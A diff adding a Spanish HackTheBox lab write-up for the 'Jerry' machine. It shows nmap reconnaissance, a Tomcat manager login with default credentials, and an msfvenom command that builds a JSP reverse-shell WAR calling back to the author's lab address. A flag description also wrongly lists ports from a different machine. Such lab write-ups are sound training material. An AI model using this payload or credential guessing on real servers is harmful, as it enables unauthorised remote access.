@@ -1,9 +1,151 @@
 ---
 title: Jerry
-date: '2023-07-07'
+date: '2023-07-08'
 lastmod: '2023-08-05'
 tags: ['labs', 'HackTheBox']
-draft: true
-summary: 'Lame is a beginner-level machine that only requires one exploit to gain root access. It was the first machine published on Hack The Box and is often the first machine for new users.'
-images: ['/static/images/htb/lame/Lame.png']
+draft: false
+summary: 'Aunque Jerry es una de las máquinas más fáciles en Hack The Box, es realista, ya que Apache Tomcat se encuentra a menudo expuesto y configurado con credenciales comunes o débiles.'
+images: ['/static/images/htb/jerry/jerry.png']
 ---
+
+![Portada](/static/images/htb/jerry/jerry.png)
+
+<br></br>
+
+<TOCInline toc={props.toc} exclude="Introduccion" />
+
+## RECONOCIMIENTO
+
+### Ping
+
+Primero que nada verificamos estar en la misma red que la maquina victima enviandole un paquete de datos a la ip 10.10.10.95 con el comando ping.
+
+```js
+  ping -c 10.10.10.95
+```
+
+- `-c` : Cantidad de paquetes de solicitud de eco ICMP (Internet Control Message Protocol) que se enviaran.
+
+![Ping](/static/images/htb/jerry/ping.png)
+
+### Nmap
+
+Luego, realizamos el escaneo de puertos.
+
+```js
+  nmap -p- --open 10.10.10.95 -Pn
+```
+
+- `-p-` : Escanea todos los puertos.
+- `--open` : Solo va a reportar los puertos que encuentre abiertos.
+- `-Pn` : Realiza el escaneo incluso si el dispositivo no responde a los pings.
+
+![Nmap1](/static/images/htb/jerry/nmap1.png)
+
+Al obtener la lista de los puertos abiertos en la maquina victima,realizamos otro escaneo pero solo a los que
+nmap reporto como abiertos incluyendo las siguientes flags:
+
+- `-sC` : Activa el escaneo utilizando scripts de enumeración y detección de servicios predeterminados. Los scripts se ejecutan contra los puertos abiertos para obtener información adicional sobre los servicios en ejecución.
+- `-sV` : Realiza una detección de versión de los servicios que se encuentran en los puertos abiertos. Nmap intenta determinar la versión y el tipo de servicio utilizando diversos métodos, como el envío de solicitudes específicas y la comparación de las respuestas recibidas.
+- `-p` : Especifica los puertos que se escanearán. En este caso, se están escaneando los puertos 21 (FTP), 22 (SSH), 139 (NetBIOS/SMB), 445 (SMB) y 3632 (distccd).
+- `-Pn` : Indica a Nmap que realice el escaneo incluso si el dispositivo no responde a los pings. Esto puede ser útil cuando el dispositivo tiene configuraciones de firewall que bloquean los paquetes ICMP de solicitud de eco.
+
+```js
+  nmap -sC -sV -p8080 10.10.10.95 -Pn
+```
+
+![Nmap2](/static/images/htb/jerry/nmap2.png)
+
+### Puertos abiertos
+
+| Puertos abiertos | Servicio | Version              |
+| ---------------- | -------- | -------------------- |
+| **_8080/tcp_**   | http     | Apache Tomcat 7.0.88 |
+
+## ENUMERACION
+
+### Puerto 8080 HTTP
+
+El puerto 8080 es comúnmente utilizado como un puerto alternativo para ejecutar servicios web. El servicio más común que se ejecuta en el puerto 8080 es un servidor web HTTP. Algunos servidores web populares, como `Apache Tomcat` y `JBoss`, utilizan el puerto `8080` como el puerto predeterminado para escuchar solicitudes HTTP. Sin embargo, es importante tener en cuenta que el puerto 8080 no está reservado exclusivamente para ningún servicio específico, por lo que otros servicios también pueden utilizarlo.
+
+En este caso el servicio proporcionado es el de `Apache`, especificamente con la
+version 7.0.88.
+
+Abrimos en un navegador la direccion `http://10.10.10.95:8080` para dirigirnos a la pagina de inicio del servidor Apache.
+
+![Apache](/static/images/htb/jerry/apache1.png)
+
+Navegamos por ella para descubrir mas cosas y al clickear en `Server Status` nos aparece un cartel
+para introducir credenciales. Ya que no tenemos, realizamos una busqueda por google acerca de
+credenciales por default que utilice Apache en general o en esta version.
+Y en esta [pagina](https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown) encontramos credenciales por default de Apache.
+
+Procedemos a probar unas de ellas y `admin:admin` nos permite loguearnos.
+
+![Apache](/static/images/htb/jerry/apache2.png)
+![Apache](/static/images/htb/jerry/apache3.png)
+
+Estamos en la pagina Server Status, esta pagina nos proporciona información detallada sobre el estado y el rendimiento del servidor web. Hacemos click en `List Applications` y me dirige a una pagina `403 - Acceso Denegado`, en la cual da un ejemplo de credenciales.
+
+![Apache](/static/images/htb/jerry/apache4.png)
+
+Como `admin:admin`, nos dio un acceso limitado en el servidor, probamos iniciar sesion
+con `tomcat:s3cret` y esta vez si tenemos acceso a `List Application`.
+
+![Apache](/static/images/htb/jerry/apache5.png)
+
+Vemos que nos da la posibilidad de cargar archivos WAR.
+![Apache](/static/images/htb/jerry/apache6.png)
+
+### WAR
+
+Los archivos WAR (Web Application Archive) son archivos comprimidos que contienen todos los componentes necesarios para ejecutar una aplicación web en el entorno de servidor Java. Estos archivos son utilizados principalmente en el desarrollo de aplicaciones Java EE (Enterprise Edition) o J2EE (Java 2 Enterprise Edition).
+
+Un archivo WAR se crea para empaquetar y distribuir una aplicación web de Java de manera conveniente. Contiene todos los archivos necesarios para implementar y ejecutar la aplicación en un contenedor de servlets, como Apache Tomcat, JBoss, WebSphere, entre otros.
+
+Buscamos en google `apache tomcat 7.0.88 war file upload` y encontramos una [web](https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/) en la cual explica paso a paso como generar un archivo WAR para obtener una [reverse shell](https://keepcoding.io/blog/que-es-una-shell-inversa/).
+
+Vamos a seguir el paso a paso de esa publicacion.
+
+## EXPLOTACION
+
+### Msfvenom
+
+`Msfvenom` es una herramienta que forma parte del marco de trabajo `Metasploit`, un conjunto de herramientas de seguridad y pruebas de penetración ampliamente utilizado. Se utiliza específicamente para generar y manipular payloads (cargas útiles) maliciosas.
+
+Una `carga útil` o `payload` es un fragmento de código malicioso que se utiliza para explotar una vulnerabilidad en un sistema o red con el fin de obtener acceso no autorizado o controlar el sistema objetivo. Estas cargas útiles se utilizan comúnmente en pruebas de penetración y evaluaciones de seguridad para detectar y corregir vulnerabilidades.
+
+Msfvenom proporciona una interfaz de línea de comandos que permite a los usuarios generar diferentes tipos de cargas útiles, como exploits, troyanos, backdoors y shellcodes, adaptados a diferentes sistemas operativos y arquitecturas. Permite personalizar y configurar varios aspectos de la carga útil, como el tipo de exploit utilizado, la codificación, la forma de entrega, el mecanismo de persistencia y mucho más.
+
+### Armando el payload
+
+```shell
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.4.2 LPORT=4646 -f war > shell.war
+```
+
+- `-p java/jsp_shell_reverse_tcp`: Especifica el tipo de payload que se va a generar, en este caso, una reverse shell TCP basada en Java JSP. Esta reverse shell TCP permite al atacante establecer una conexión desde el sistema comprometido hacia el sistema del atacante.
+
+- `LHOST=10.10.4.2`: Define la dirección IP a la cual la carga útil se conectará de forma reversa. En este caso, se utiliza la dirección IP "10.10.4.2" (vpn de `HTB`) como ejemplo. Debes reemplazarla con la dirección IP real del sistema que actuará como el punto de escucha para recibir la conexión de reversa.
+
+- `LPORT=4646`: Especifica el puerto en el cual el payload se conectará de forma reversa. En este caso, se utiliza el puerto "4646" como ejemplo. Puedes modificarlo según tus necesidades, siempre teniendo en cuenta que no esté bloqueado por firewalls o utilizados por otros servicios.
+
+- `-f war`: Indica el formato de salida deseado para la carga útil generada. En este caso, se especifica que se desea generar un archivo WAR (Web Application Archive), como se describió anteriormente.
+
+- `> shell.war`: Redirige la salida generada por msfvenom hacia un archivo llamado "shell.war". Puedes cambiar el nombre del archivo según tus preferencias.
+
+![Exploit](/static/images/htb/jerry/exploit.png)
+
+Luego de haber generado el exploit, ponemos el puerto 4646 en escucha.
+
+![Puerto](/static/images/htb/jerry/puerto.png)
+
+Volvemos a la pagina del servidor Apache,cargamos nuestro exploit y navegamos hacia `http://10.10.10.95:8080/shell/`.
+
+![Carga](/static/images/htb/jerry/upload.png)
+![Carga2](/static/images/htb/jerry/upload2.png)
+![Shell](/static/images/htb/jerry/shell.png)
+
+Volvemos a la consola donde teniamos el puerto 4646 en escucha y nos encontramos dentro de la maquina
+victima. Luego de eso navegamos por los directorios y encontramos las dos flags juntas.
+![Dir](/static/images/htb/jerry/dir1.png)
+![Dir2](/static/images/htb/jerry/dir2.png)
